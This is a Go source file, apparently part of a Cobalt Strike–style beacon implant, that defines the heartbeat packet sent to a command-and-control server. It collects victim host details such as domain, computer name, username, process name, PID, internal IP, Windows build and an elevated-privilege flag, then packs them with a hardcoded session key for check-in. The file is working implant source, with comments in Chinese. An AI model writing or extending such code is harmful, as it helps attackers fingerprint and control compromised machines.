package sysinfo

import (
	"Beacon/profile"
	"Beacon/utils/packet"
	"encoding/binary"
	"fmt"
)

type HeartBeat struct {
	BeaconID    uint32 // rand id
	BeaconName  string
	Sleep       int32 // 秒
	Jitter      int32 // 没有用到
	KillDate    int32 // 没有用到
	WorkingTime int32 // 没有用到
	ACP         int32 // ANSI code page
	OemCP       int32 // OEM code page
	GmtOffset   int32 // 分钟
	Pid         int16
	Tid         int16
	BuildNumber int32
	MajorVer    int8
	MinorVer    int8
	InternalIP  uint32 // IPv4 转 uint32
	Flag        int8   // 0b00000101

	SessionKey []byte // 加解密任务包和结果包

	Domain   []byte
	Computer []byte
	Username []byte
	Process  []byte
}

func ip2int(ip string) uint32 {
	var b [4]byte
	fmt.Sscanf(ip, "%d.%d.%d.%d", &b[0], &b[1], &b[2], &b[3])
	return binary.BigEndian.Uint32(b[:])
}

func InitHeartBeat() HeartBeat {
	heartBeat := HeartBeat{}
	//heartBeat.BeaconID = rand.Uint32()
	heartBeat.BeaconID = 0x55667788
	heartBeat.BeaconName = "Beacon"
	heartBeat.Sleep = int32(profile.BeaconProfile.Sleep)
	heartBeat.Jitter = int32(profile.BeaconProfile.Jitter)

	//heartBeat.KillDate = profile.BeaconProfile.
	heartBeat.KillDate = int32(10)
	heartBeat.WorkingTime = int32(0)
	acp, _ := GetCodePageANSI()
	heartBeat.ACP = acp
	oemcp, _ := GetCodePageOEM()
	heartBeat.OemCP = oemcp
	heartBeat.GmtOffset = GetGmtOffset()
	heartBeat.Pid = GetPid()
	heartBeat.Tid = GetTID()
	buildNumber, _ := GetWindowsBuildNumber()
	majorVersion, _ := GetWindowsMajorVersion()
	minorVersion, _ := GetWindowsMinorVersion()
	heartBeat.BuildNumber = buildNumber
	heartBeat.MinorVer = minorVersion
	heartBeat.MajorVer = majorVersion
	heartBeat.InternalIP = ip2int(GetInternalIp())
	heartBeat.Flag = int8(0b00000111) // beacon.arch = x64,system.arch = x64,Elevated = true(管理员权限)
	heartBeat.SessionKey = []byte("01234567890123456789")
	heartBeat.Domain = []byte(GetDomain())
	heartBeat.Computer = []byte(GetComputerName())
	heartBeat.Username = []byte(GetUsername())
	heartBeat.Process = []byte(GetProcessName())

	return heartBeat
}

func PackHeartBeat(heartBeat HeartBeat) []byte {
	// 按顺序组织字段
	fields := []interface{}{
		int32(heartBeat.BeaconID),              // int32
		heartBeat.BeaconName,                   //string
		heartBeat.Sleep,                        // int32
		heartBeat.Jitter,                       // int32
		heartBeat.KillDate,                     // int32
		heartBeat.WorkingTime,                  // int32
		heartBeat.ACP,                          // int16
		heartBeat.OemCP,                        // int16
		heartBeat.GmtOffset,                    // int8
		heartBeat.Pid,                          // int16
		heartBeat.Tid,                          // int16
		heartBeat.BuildNumber,                  // int32
		heartBeat.MajorVer,                     // int32
		heartBeat.MinorVer,                     // int32
		int32(heartBeat.InternalIP),            // int32
		heartBeat.Flag,                         // int8
		packet.PackBytes(heartBeat.SessionKey), // []byte
		packet.PackBytes(heartBeat.Domain),     // []byte
		packet.PackBytes(heartBeat.Computer),   // []byte
		packet.PackBytes(heartBeat.Username),   // []byte
		packet.PackBytes(heartBeat.Process),    // []byte
	}

	// 调用统一的打包器
	data, err := packet.PackArray(fields)
	if err != nil {
		fmt.Println("error:", err)
		return nil
	}
	return data
}
